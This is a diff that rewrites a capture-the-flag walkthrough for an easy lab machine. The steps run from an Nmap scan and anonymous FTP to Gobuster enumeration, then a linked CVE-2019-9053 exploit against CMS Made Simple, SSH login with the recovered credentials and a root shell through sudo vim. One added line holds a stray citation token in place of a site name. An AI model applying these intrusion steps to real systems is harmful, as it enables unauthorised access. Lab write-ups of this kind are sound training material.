@@ -1,112 +1,104 @@
 # Lunch the Machine Walkthrough
 
-> Target IP: 10.113.139.247  
-> Difficulty: Easy  
-> Topics: Enumeration | Web Exploitation | Privilege Escalation
+This was a fun beginner box that involved some web enumeration, exploiting a vulnerable CMS, and a simple privilege escalation using a misconfigured sudo permission.
 
----
+## Recon
 
-# Reconnaissance
-
-The first thing I did was run an Nmap scan to identify open ports and services:
+As usual, I started with an Nmap scan to see what was running on the target.
 
 ```bash
 nmap -sV 10.113.139.247
 ```
 
-The scan revealed three open ports:
+The scan showed three open ports:
 
 - **21** — FTP (`vsftpd 3.0.3`)
-- **80** — Apache Web Server
+- **80** — Apache web server
 - **22** — SSH
 
-FTP and the web server looked especially interesting, so I started enumerating those.
+Since FTP allowed anonymous access sometimes, I decided to check that first.
 
 ---
 
-# FTP Enumeration
+## FTP Enumeration
 
-I first tested anonymous FTP login:
+I connected to FTP using:
 
 ```bash
 ftp 10.113.139.247
 ```
 
-Login with:
+Then logged in with:
 
 ```bash
 Username: anonymous
 Password: [Press Enter]
 ```
 
-Anonymous login worked successfully, but after exploring the files available on the FTP server, there was nothing useful.
-
-Since FTP was a dead end, I moved on to the web server.
+The login worked, but after poking around there wasn’t really anything useful there, so I moved on.
 
 ---
 
-# Web Enumeration
+## Web Enumeration
 
-To discover hidden directories, I ran Gobuster:
+Since the web server was running, I started directory brute forcing with Gobuster:
 
 ```bash
 gobuster dir -u http://10.113.139.247 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 ```
 
-Gobuster returned an interesting result:
+One interesting result popped up:
 
 ```bash
 /simple
 ```
 
-Browsing to:
+Going to:
 
 ```bash
 http://10.113.139.247/simple
 ```
 
-revealed **CMS Made Simple**.
+showed a **CMS Made Simple** installation.
 
-After inspecting the site, I found the version was:
+I spent a little time looking around the site and eventually identified the version as:
 
 ```bash
 2.2.8
 ```
 
+That was promising, so I searched for public exploits.
+
 ---
 
-# Exploitation
+## Exploitation
 
-I searched for known vulnerabilities affecting this version and found:
+A quick search for vulnerabilities affecting this version led me to:
 
 **CVE-2019-9053**
 
-A working exploit was available on GitHub:
+I found a working exploit on GitHub:
 
 https://github.com/Perseus99999/CVE-2019-9053-working-/blob/main/exploit.py
 
-After downloading and running the exploit, it returned credentials:
+After running the exploit and letting it do its thing, it eventually returned credentials:
 
 ```bash
 Username: mitch
 Password: secret
 ```
 
-I first tried logging into the CMS admin panel at:
+Always a good day when an exploit gives you creds.
 
-```bash
-http://10.113.139.247/simple/admin
-```
+I tried them in the CMS admin panel first (`/simple/admin`), but didn’t find much interesting there.
 
-The credentials worked, but I didn’t find anything useful there.
-
-Then I remembered SSH was open from the Nmap scan, so I tried reusing the credentials there.
+Then I remembered SSH was open.
 
 ---
 
-# Initial Access
+## Initial Access
 
-SSH login:
+Tried the same credentials over SSH:
 
 ```bash
 ssh mitch@10.113.139.247
@@ -118,25 +110,27 @@ Password:
 secret
 ```
 
-And we get a shell.
+And… we’re in.
+
+Sometimes credential reuse really is that easy.
 
 ---
 
-# User Flag
+## User Flag
 
-Listing the files in Mitch’s home directory:
+After logging in, I checked the home directory:
 
 ```bash
 ls
 ```
 
-revealed:
+Saw the first flag:
 
 ```bash
 user.txt
 ```
 
-Reading it gives the first flag:
+Read it:
 
 ```bash
 cat user.txt
@@ -146,9 +140,9 @@ User flag captured.
 
 ---
 
-# Privilege Escalation
+## Privilege Escalation
 
-Next step was checking sudo permissions:
+Next step was checking what Mitch could run with sudo:
 
 ```bash
 sudo -l
@@ -160,40 +154,41 @@ Interesting result:
 (root) NOPASSWD: /usr/bin/vim
 ```
 
-The user can run **vim** as root.
+Being able to run Vim as root is basically game over.
 
-Checking GTFOBins for Vim privilege escalation techniques showed this:
+I checked :contentReference[oaicite:0]{index=0} and used the Vim escape:
 
 ```bash
 vim -c ':!/bin/sh'
 ```
 
-Running it spawned a root shell.
+That dropped me straight into a root shell.
+
+Very nice.
 
 ---
 
-# Root Flag
+## Root Flag
 
-Now move into the root directory:
+Once root, I moved into the root directory:
 
 ```bash
 cd /root
 ls
 ```
 
-We find:
+Found the final flag:
 
 ```bash
 root.txt
 ```
 
-Read the flag:
+Read it:
 
 ```bash
 cat root.txt
 ```
 
-Root flag captured.
 
 
 
